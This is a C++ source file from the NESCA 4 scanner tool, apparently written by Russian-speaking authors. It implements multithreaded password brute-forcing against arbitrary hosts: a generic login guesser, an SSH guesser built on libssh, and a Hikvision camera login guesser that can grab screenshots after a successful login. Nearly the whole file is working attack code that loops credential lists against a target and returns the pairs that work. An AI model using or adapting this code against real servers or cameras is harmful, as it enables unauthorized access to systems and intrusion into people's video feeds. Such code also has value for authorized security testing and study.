/*
 * NESCA 4
 * by oldteam & lomaster
 * license GPL-3.0
 *   Сделано от души 2023.
*/

#include "include/bruteforce.h"
#include "include/other.h"
#include "lib/HCNetSDK.h"
#include "modules/include/hikvision.h"
#include "ncsock/include/bruteforce.h"
#include "ncsock/include/socket.h"
#include "ncsock/include/ftp.h"
#include <mutex>

std::string 
threads_bruteforce(const std::vector<std::string>& login, std::vector<std::string>& pass,
        std::string http_path, std::string ip, int port, int delay, uint8_t proto, int brute_log)
{
	std::vector<std::future<void>> futures;
	thread_pool pool(100);
  std::string result = "";
  std::mutex wait;

  for (const auto& l : login){
    for (const auto& p : pass){
      futures.push_back(pool.enqueue([&wait, l, p, ip, port, proto, http_path, delay, &result]() {

        wait.lock();
        bruteforce_opts bo;
        bo.dest_ip = ip.c_str();
        bo.dest_port = port;
        bo.proto = proto;
        bo.http_path = http_path.c_str();
        bo.delay_ms = delay;
        bo.login = l.c_str();
        bo.pass = p.c_str();
        wait.unlock();

        int auth = ncsock_bruteforce(&bo);
        if(auth == 0){result = l + ":" + p + "@";}
      }));
    }
  }

  for (auto& future : futures){future.wait();}
  if (!result.empty()){return result;}
  return "";
}

nesca_prints np1;

std::string 
brute_ssh(const std::string& ip, int port, const std::string login, const std::string pass, int brute_log, int verbose)
{
#ifdef HAVE_SSL
    if (brute_log) {np1.nlog_custom("SSH", "                 try: " + login + "@" + pass + " [BRUTEFORCE]\n", 1);}

    ssh_session sshSession = ssh_new();
    if (sshSession == nullptr){return "";}

	const int timeout = 2;
	ssh_options_set(sshSession, SSH_OPTIONS_TIMEOUT, &timeout);
    ssh_options_set(sshSession, SSH_OPTIONS_HOST, ip.c_str());
    ssh_options_set(sshSession, SSH_OPTIONS_PORT, &port);
    ssh_options_set(sshSession, SSH_OPTIONS_USER, login.c_str());

    int connectionStatus = ssh_connect(sshSession);
    if (connectionStatus != SSH_OK) {
	   if (verbose) {std::cerr << "Не удалось установить соединение SSH: " << ssh_get_error(sshSession) << std::endl;}
        ssh_free(sshSession);
        return "";
    }

    int authenticationStatus = ssh_userauth_password(sshSession, nullptr, pass.c_str());
    if (authenticationStatus != SSH_AUTH_SUCCESS) {
	   if (verbose) {std::cerr << "Не удалось авторизоваться: " << ssh_get_error(sshSession) << std::endl;}
        ssh_disconnect(sshSession);
        ssh_free(sshSession);
        return "";
    }

    if (verbose){std::cout << "Авторизация прошла успешно!" << std::endl;}

    ssh_disconnect(sshSession);
    ssh_free(sshSession);

    std::string result = login + ":" + pass + "@";
    return result;
#else
    return "no_ssh";
#endif
}

std::string 
threads_brute_ssh(const std::string ip, int port, const std::vector<std::string> logins, const std::vector<std::string> passwords, int brute_log, int verbose, int brute_timeout_ms) 
{
    std::vector<std::string> results;
	std::vector<std::future<void>> futures;
	thread_pool pool(100);

    for (const auto& login : logins) {
        for (const auto& password : passwords) {
            delay_ms(brute_timeout_ms);
			futures.push_back(pool.enqueue([ip, port, login, password, brute_log, verbose, &results]() {
                std::string temp = brute_ssh(ip, port, login, password, brute_log, verbose);
                if (!temp.empty() && temp.length() > 3){results.push_back(temp);}
            }));
        }
    }
	for (auto& future : futures) {future.wait();}

    if (!results.empty()) {return results[0];} else{return "";}
    return "";
}

std::string 
brute_hikvision(const std::string ip, const std::string login, const std::string pass, int brute_log, const std::string& path)
{
#ifdef HAVE_HIKVISION
  std::string result;
  std::string screenshotFilename = "screenshot.jpg";

  /*Перенаправление лога, потому что он выводит сообщение которое нам не надо.*/
  freopen("/dev/null", "w", stderr);
  NET_DVR_Init();

  NET_DVR_USER_LOGIN_INFO loginInfo = {0};
  loginInfo.bUseAsynLogin = false;

  strcpy(loginInfo.sDeviceAddress, ip.c_str());
  loginInfo.wPort = 8000;

  strcpy(loginInfo.sUserName, login.c_str());
  strcpy(loginInfo.sPassword, pass.c_str());

  NET_DVR_DEVICEINFO_V40 deviceInfo = {0};

  if (brute_log){
      np1.nlog_custom("HIKVISION", "                 try: " + login + "@" + pass + " [BRUTEFORCE]\n", 1);
  }

  LONG userId = NET_DVR_Login_V40(&loginInfo, &deviceInfo);

  if (userId < 0)
  {
    NET_DVR_Cleanup();
    return "";
  }

  if (path != "")
  {
      hikvision_screenshot(ip, userId, deviceInfo, path);
      std::cout << "asasdasd\n";
  }

  result = login + ":" + pass + "@";

  NET_DVR_Logout(userId);
  NET_DVR_Cleanup();

  return result;
#else
  return "no_hikvision";
#endif
}

std::string 
threads_brute_hikvision(const std::string ip, const std::vector<std::string> logins, const std::vector<std::string> passwords, int brute_log, int brute_timeout_ms, const std::string&path)
{
    std::vector<std::string> results;
	std::vector<std::future<void>> futures;
	thread_pool pool(100);

    for (const auto& login : logins) {
        for (const auto& password : passwords) {
            delay_ms(brute_timeout_ms);
			futures.push_back(pool.enqueue([ip, login, password, brute_log, path, &results]() {
                std::string temp = brute_hikvision(ip, login, password, brute_log, path);
                if (!temp.empty() && temp.length() > 3){results.push_back(temp);}
            }));
        }
    }
	for (auto& future : futures) {future.wait();}
    if (!results.empty()) {return results[0];} else{return "";}

    return "";
}
